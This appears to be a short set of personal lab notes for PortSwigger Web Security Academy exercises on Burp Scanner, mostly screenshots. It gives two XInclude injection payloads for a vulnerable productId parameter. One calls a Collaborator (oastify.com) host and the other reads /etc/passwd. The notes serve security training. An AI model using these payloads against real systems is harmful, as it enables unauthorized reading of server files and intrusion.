# burp-essential-skills
https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/
<br><br>

Lab: Discovering vulnerabilities quickly with targeted scanning

<img width="1171" height="739" alt="image" src="https://github.com/user-attachments/assets/aae630f0-4e38-4b0b-9231-29e2ccffa884" />

<br><br>

<img width="745" height="515" alt="image" src="https://github.com/user-attachments/assets/b75cdfe9-1737-4c4f-aed4-dc75d1ee80ec" />

<br><br>

productId parameter is vulnerable, Url encoded payload 
<img width="524" height="538" alt="image" src="https://github.com/user-attachments/assets/cff3e345-aeb1-49ec-9dcd-e0787ecf53c7" />

<br><br>

repeater

<br><br>

origin payload: 
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>```

win payload:
```<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>```

<img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />

<br><br><br><br><br><br><br><br><br><br>

Lab: Scanning non-standard data structures
<br>
To solve the lab, use Burp Scanner's Scan selected insertion point feature to identify the vulnerability, then manually exploit it and delete carlos.

<br>
server said: browser, set this as a session cookie of user.
if we want to test sth, we want to test sth that is predictable
<img width="837" height="678" alt="image" src="https://github.com/user-attachments/assets/8821726f-965e-4626-aaab-fcce57d75bd8" />

<br>
> audit selected items
<img width="555" height="464" alt="image" src="https://github.com/user-attachments/assets/12d547b0-2b8a-4cab-8406-6810891f865a" />


